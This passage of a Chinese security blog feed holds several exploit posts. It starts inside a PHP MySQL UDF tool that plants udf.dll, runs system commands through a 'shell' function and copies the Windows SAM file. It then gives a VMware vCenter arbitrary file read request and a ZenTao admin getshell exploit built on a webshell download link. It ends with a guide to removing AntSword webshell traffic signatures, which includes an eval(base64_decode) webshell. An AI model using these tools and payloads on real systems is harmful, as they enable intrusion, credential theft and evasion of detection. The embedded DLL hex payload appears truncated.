server.]&lt;/font&gt;&lt;/i&gt;&lt;/b&gt;&#x27;</span>;</span><br><span class="line">			$_SESSION[<span class="string">&#x27;notsame&#x27;</span>] = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;plugin_dir&lt;/b&gt;:&#x27;</span>;</span><br><span class="line">	$meta = mysql_query(<span class="string">&#x27;show variables like &quot;plugin_dir&quot;&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_num_rows($meta)==<span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color=white&gt;mysql is under 5.1 , &#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;notsame&#x27;</span>]))</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27; u can dump udf.dll to any directory in follow paths&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&#x27;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//over 5.1</span></span><br><span class="line">		$_SESSION[<span class="string">&#x27;over51&#x27;</span>] = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">		$row = mysql_fetch_row($meta);</span><br><span class="line">		$_SESSION[<span class="string">&#x27;plugindir&#x27;</span>] = str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\\\\&#x27;</span>,str_replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,$row[<span class="number">1</span>])).<span class="string">&#x27;\\\\udf.dll&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color=white&gt;&#x27;</span>.str_replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,$row[<span class="number">1</span>]).<span class="string">&#x27;&lt;/font&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27; (mysql over 5.1, udf.dll can only dump to plugin_dir) &#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;notsame&#x27;</span>])) </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27; &lt;font&gt;&lt;b&gt;&lt;i&gt;[maybe dump dll will be failed!]&lt;/i&gt;&lt;/b&gt;&lt;/font&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (!file_exists(str_replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,$row[<span class="number">1</span>]))) </span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27; &lt;a href=&quot;?action=cplug&amp;dir=&#x27;</span>.base64_encode(str_replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,$row[<span class="number">1</span>])).<span class="string">&#x27;&quot;&gt;Create PluginDir&lt;/a&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27; exists!&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;notsame&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;over51&#x27;</span>]))</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;path&lt;/b&gt;:&lt;font color=green&gt;&lt;b&gt;&#x27;</span>.getenv(<span class="string">&#x27;path&#x27;</span>).<span class="string">&#x27;&lt;/b&gt;&lt;/font&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"> 	$meta = mysql_query(<span class="string">&#x27;select 1,1,1,1 from mysql.user union select * from mysql.func&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_num_rows($meta)==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;Mysql.Func&lt;/b&gt; : &lt;font color=white&gt;&lt;b&gt;&lt;i&gt;&lt;font color=red&gt;dont exist!&lt;/font&gt;&lt;/i&gt;&lt;/b&gt;&lt;/font&gt; must &lt;a href=&quot;?action=func&quot;&gt;create&lt;/a&gt; mysql.func first!&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;Mysql.Func&lt;/b&gt; : &lt;font color=green&gt;exist!&lt;/font&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;grants&lt;/b&gt; : &lt;font color=white&gt;&#x27;</span>;</span><br><span class="line">	$meta = mysql_query(<span class="string">&#x27;show grants;&#x27;</span>,$conn);</span><br><span class="line">	<span class="keyword">while</span> ($row = mysql_fetch_row($meta)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $row[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> ($close)</span><br><span class="line">		mysql_close($conn);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line">		$path = $_POST[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc()) </span><br><span class="line">			$path = stripslashes($path);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		$path = <span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;plugindir&#x27;</span>]) ? $_SESSION[<span class="string">&#x27;plugindir&#x27;</span>] : <span class="string">&#x27;c:\\\\windows\\\\system32\\\\udf.dll&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;border:solid 1px #333;background-color:#999;padding:4px&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;install&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;path&quot; size=&quot;60&quot; value=&quot;&#x27;</span>.$path.<span class="string">&#x27;&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Dump UDF&quot;&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;exec&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;dump&quot; value=&quot;d&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;sql&quot; size=&quot;60&quot; value=&quot;CREATE FUNCTION shell RETURNS STRING SONAME \&#x27;udf.dll\&#x27;&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Create Function&quot;&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;copy&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;c:\\\\WINDOWS\\\\repair\\\\sam&quot; name=&quot;source&quot; size=30&gt;  &lt;input type=&quot;text&quot; name=&quot;target&quot; size=30&gt; &lt;input type=&quot;submit&quot; value=&quot;Copy&quot;&gt; &lt;font color=white&gt;please convert \\ to \\\\&lt;/font&gt;&lt;/form&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;sql&#x27;</span>]))</span><br><span class="line">		$sql = $_POST[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		$sql = <span class="string">&#x27;select * from mysql.user&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">		$sql = stripslashes($sql);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;dump&#x27;</span>]))</span><br><span class="line">		$sql = <span class="string">&#x27;select shell(\&#x27;cmd\&#x27;,\&#x27;whoami\&#x27;)&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;exec&quot;&gt;&lt;textarea id=&quot;sql2&quot; cols=&quot;100&quot; rows=&quot;5&quot; name=&quot;sql&quot;&gt;&#x27;</span>.$sql.<span class="string">&#x27;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;Mysql_query&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Load_File&quot; onclick=&quot;loadfile()&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Into OutFile&quot; onclick=&quot;outfile()&quot;&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cplug</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$path = $_GET[<span class="string">&#x27;dir&#x27;</span>];</span><br><span class="line">	$path = base64_decode($path);</span><br><span class="line">	$arr = explode(<span class="string">&#x27;\\&#x27;</span>,$path);</span><br><span class="line">	$p = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$err = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span> ($index = <span class="number">0</span>,$count = count($arr);$index&lt;$count;$index++) &#123;</span><br><span class="line">		$p .= ($arr[$index] . <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!file_exists($p)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!mkdir($p)) &#123;</span><br><span class="line">				$err = <span class="string">&#x27;create &#x27;</span>.$p.<span class="string">&#x27;failed !&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	conn();</span><br><span class="line">	<span class="keyword">if</span> ($err != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		<span class="keyword">exit</span>($err);</span><br><span class="line">	<span class="keyword">if</span> (file_exists($path))</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;plugin_dir create success !&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;plugin_dir create failed !&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execsql</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	$conn = conn(<span class="literal">false</span>);</span><br><span class="line">	$sql = $_POST[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">		$sql = stripslashes($sql);</span><br><span class="line">	$rs = mysql_query($sql,$conn);</span><br><span class="line">	<span class="keyword">echo</span> mysql_info($conn);</span><br><span class="line">	<span class="keyword">if</span> (@mysql_num_rows($rs) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;table border=&quot;1&quot;&gt;&#x27;</span>;</span><br><span class="line">		$cols = mysql_num_fields($rs);</span><br><span class="line">		$index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">while</span> ($index &lt; $cols) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;th&gt;&#x27;</span>.mysql_field_name($rs,$index).<span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">			$index ++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">while</span> ($row = mysql_fetch_row($rs)) &#123;</span><br><span class="line">			$index = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">while</span> ($index &lt; $cols) &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt;&#x27;</span>;</span><br><span class="line">				<span class="keyword">echo</span> str_replace(chr(<span class="number">13</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,htmlspecialchars($row[$index]));</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">				$index ++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line"> 		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">echo</span> mysql_error();</span><br><span class="line">	mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$conn = conn(<span class="literal">false</span>);</span><br><span class="line">	$source = $_POST[<span class="string">&#x27;source&#x27;</span>];</span><br><span class="line">	$target = $_POST[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc()) &#123;</span><br><span class="line">		$source = stripslashes($source);</span><br><span class="line">		$target = stripslashes($target);</span><br><span class="line">	&#125;</span><br><span class="line">	mysql_query(<span class="string">&#x27;select unhex(hex(load_file(&quot;&#x27;</span>.$source.<span class="string">&#x27;&quot;))) into dumpfile &quot;&#x27;</span>.$target.<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">echo</span> mysql_error().<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;done !&#x27;</span>;</span><br><span class="line">	mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">install</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//dump udf.dll</span></span><br><span class="line">	$conn = conn(<span class="literal">false</span>);</span><br><span class="line">	$path = $_POST[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc()) </span><br><span class="line">		$path = stripslashes($path);</span><br><span class="line">	mysql_query(<span class="string">&#x27;create table udftmp (c blob)&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error().<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">		mysql_query(<span class="string">&#x27;drop table udftmp&#x27;</span>);</span><br><span class="line">		mysql_close($conn);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	mysql_query(<span class="string">&#x27;insert into udftmp values(convert(0xx27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error().<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">		mysql_close($conn);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	mysql_query(<span class="string">&#x27;select c from udftmp into dumpfile &quot;&#x27;</span>.$path.<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error(). <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">		mysql_query(<span class="string">&#x27;drop table udftmp&#x27;</span>);</span><br><span class="line">		mysql_close($conn);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	mysql_query(<span class="string">&#x27;drop table udftmp&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) !=<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Dump DLL Failed.&#x27;</span>.mysql_error();</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Dump DLL Success!&#x27;</span>;</span><br><span class="line">	mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>注入产生原因就是对用户输入的数据未进行严格校验，导致可以构造恶意语句。</p>
</blockquote>
<blockquote>
<p>本篇文章仅仅介绍MYSQL的基础。</p>
</blockquote>
]]></content>
      <categories>
        <category>知识整理</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>漏洞</tag>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Vmware Vcenter 任意文件读取</title>
    <url>/posts/69cd81e7/</url>
    <content><![CDATA[<p>监测到twitter平台上，有人发出任意文件读取漏洞，目前暂未申请cve</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>VMware vCenterServer 提供了一个可伸缩、可扩展的平台，为 虚拟化管理奠定了基础。 VMware vCenter  Server（以前称为 VMware VirtualCenter），可集中管理 VMware vSphere  环境，与其他管理平台相比，极大地提高了 IT 管理员对虚拟环境的控制。<br> VMware vCenter Server：提高在虚拟基础架构每个级别上的集中控制和可见性，通过主动管理发挥 vSphere 潜能，是一个具有广泛合作伙伴体系支持的可伸缩、可扩展平台。</p>
<p>监测到twitter平台上，有人发出任意文件读取漏洞，目前暂未申请cve</p>
<p>6.5u1该漏洞被修复。</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;eam&#x2F;vlib?id&#x3D;c:\desktop.ini HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>

<p><img src="/posts/69cd81e7/img20201014073741.jpg"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p>We found an Unauthenticated Arbitrary File Read vulnerability in  VMware vCenter. VMware revealed that this vulnerability was patched in  6.5u1, but no CVE was assigned.</p>
</blockquote>
<blockquote>
<p>The PoC ️ <span class="exturl" data-url="aHR0cHM6Ly90LmNvL0xmdmJ5QlVoRjU=">https://t.co/LfvbyBUhF5<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>禅道后台管理员权限Getshell</title>
    <url>/posts/e07fd52d/</url>
    <content><![CDATA[<p>禅道后台管理员权限Getshell。</p>
<a id="more"></a>

<h1 id="禅道后台管理员权限Getshell"><a href="#禅道后台管理员权限Getshell" class="headerlink" title="禅道后台管理员权限Getshell"></a>禅道后台管理员权限Getshell</h1><p>原文地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L3RocmVhZC01ODQxNS0xLTEuaHRtbA==">https://www.t00ls.net/thread-58415-1-1.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul>
<li>module/client/control.php:86</li>
</ul>
<p><img src="/posts/e07fd52d/01.png"></p>
<ul>
<li>参数直接传入 module，跟进 downloadZipPackage 函数，全局搜索发现有两个downloadZipPackage函数：</li>
</ul>
<p>module/client/ext/model/xuanxuan.php:10<img src="/posts/e07fd52d/02.png"></p>
<p>对 link 参数解密后进行过滤，如果正则匹配到 http(s):// 则返回false，可以使用FTP协议绕过。</p>
<p>module/client/model.php:240    <img src="/posts/e07fd52d/03.png"></p>
<p>base64 解密 link 参数后将下载文件至 data/client/ 拼接 version 参数的目录，无任何过滤。</p>
<p>调用路径：control -&gt; ext module -&gt; module</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Exploit：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/zentao/client-download-1-(base64 encode webshell download link)-1.html</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/zentao/data/client/1/(download link filename)</span><br></pre></td></tr></table></figure>

<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>使用FTP协议下载文件，绕过 module/client/ext/model/xuanxuan.php:10 downloadZipPackage 的HTTP协议过滤。</p>
<p><img src="/posts/e07fd52d/04.png"></p>
<p><img src="/posts/e07fd52d/05.png"></p>
<h2 id="新版已修复"><a href="#新版已修复" class="headerlink" title="新版已修复"></a>新版已修复</h2><p>官方最新开源版禅道 12.4.3，增加了白名单机制:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$config-&gt;file-&gt;allowed = <span class="string">&#x27;txt,doc,docx,dot,wps,wri,pdf,ppt,pptx,xls,xlsx,ett,xlt,xlsm,csv,jpg,jpeg,png,psd,gif,ico,bmp,swf,avi,rmvb,rm,mp3,mp4,3gp,flv,mov,movie,rar,zip,bz,bz2,tar,gz,mpp,rp,pdm,vsdx,vsd,sql&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e07fd52d/image-20201022161557542.png" alt="image-20201022161557542"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>禅道</tag>
      </tags>
  </entry>
  <entry>
    <title>改造蚁剑</title>
    <url>/posts/b371c6dd/</url>
    <content><![CDATA[<p>蚁剑的默认特征，，，，</p>
<a id="more"></a>

<h2 id="默认特征"><a href="#默认特征" class="headerlink" title="默认特征"></a>默认特征</h2><p>ip</p>
<ul>
<li>172.16.49.184</li>
</ul>
<p>version</p>
<ul>
<li>2.1.9</li>
</ul>
<h3 id="默认编码"><a href="#默认编码" class="headerlink" title="默认编码"></a>默认编码</h3><p>默认连接时未对流量进行任何的处理,文件为：<code>antSword-master/source/core/php/index.js</code></p>
<p>一句话马第一次连接时特征</p>
<ul>
<li>User-Agent</li>
</ul>
<p>6354a03f`随机字符(每次连接时的随机)；</p>
<p>返回服务器的版本信息，Web路径，等信息</p>
<p><img src="/posts/b371c6dd/image-20201109102928919.png" alt="image-20201109102928919"></p>
<p>在<code>antSword-master/source/core/php/index.js</code>中组合的代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 组合完整的代码</span></span><br><span class="line">  <span class="keyword">let</span> tmpCode = data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  data[<span class="string">&#x27;_&#x27;</span>] = <span class="string">`@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);<span class="subst">$&#123;asencCode&#125;</span>;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;<span class="subst">$&#123;tag_s&#125;</span>&quot;;echo @asenc($output);echo &quot;<span class="subst">$&#123;tag_e&#125;</span>&quot;;&#125;ob_start();try&#123;<span class="subst">$&#123;tmpCode&#125;</span>;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();`</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到流量完全明文。</p>
<h3 id="base64编码器"><a href="#base64编码器" class="headerlink" title="base64编码器"></a>base64编码器</h3><p>进行了一层base64编码，流量传输，使用了<code>eval</code>函数和<code>base64_decode</code>函数:<code>@eval(@base64_decode($_POST[q1c5a24e6362ef]));</code></p>
<ul>
<li>eval</li>
<li>Base64_decode</li>
</ul>
<p><img src="/posts/b371c6dd/image-20201109110853122.png" alt="image-20201109110853122"></p>
<h3 id="CHR编码器"><a href="#CHR编码器" class="headerlink" title="CHR编码器"></a>CHR编码器</h3><p>默认<code>eval</code>和<code>chr()</code>、<code>.</code></p>
<ul>
<li>eval + chr() + .</li>
</ul>
<p><img src="/posts/b371c6dd/image-20201109111450139.png" alt="image-20201109111450139"></p>
<h3 id="chr-16"><a href="#chr-16" class="headerlink" title="chr(16)"></a>chr(16)</h3><p>同CHR</p>
<h3 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h3><ul>
<li><p>eval</p>
</li>
<li><p>str_rot13</p>
</li>
</ul>
<p>同base64</p>
<h2 id="修改特征"><a href="#修改特征" class="headerlink" title="修改特征"></a>修改特征</h2><p>没办法，也只能讲BASE64写在服务端，这样才能实现客户端通信流量的完全无特征。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2020/11/09 11:26:29</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="comment">// 以下代码为 PHP Base64 样例</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成一个随机变量名</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 原有的 payload 在 data[&#x27;_&#x27;]中</span></span><br><span class="line">  <span class="comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span></span><br><span class="line">  data[randomID] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  data[pwd] = <span class="string">`eval(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>]));`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>base64编码器在data[pwd]设置为base64解码代码，data[randomID]设置为原代码的base64编码数据，最后删除掉data里的原有payload  data[‘_’]</li>
</ul>
<p>这里的明显特征就是eval和base64_decode。</p>
<p>那么可以找到对应的方法绕过。也即是说，所有的编码器都可以变成无特征，即：传输前对内容进行编码，然后在木马中设置解码。</p>
<ul>
<li>木马：<code>&lt;?php eval(base64_decode($_POST[&quot;test&quot;]));?&gt;</code></li>
<li>传输内容：<code>base64编码后的内容</code></li>
</ul>
<h3 id="01编码器Demo"><a href="#01编码器Demo" class="headerlink" title="01编码器Demo"></a>01编码器Demo</h3><ul>
<li>注释掉模版的base64编码，直接设置传输内容为base64编码。</li>
<li>一句话设置为<code>&lt;?php eval(base64_decode($_POST[&quot;test&quot;]));?&gt;</code></li>
</ul>
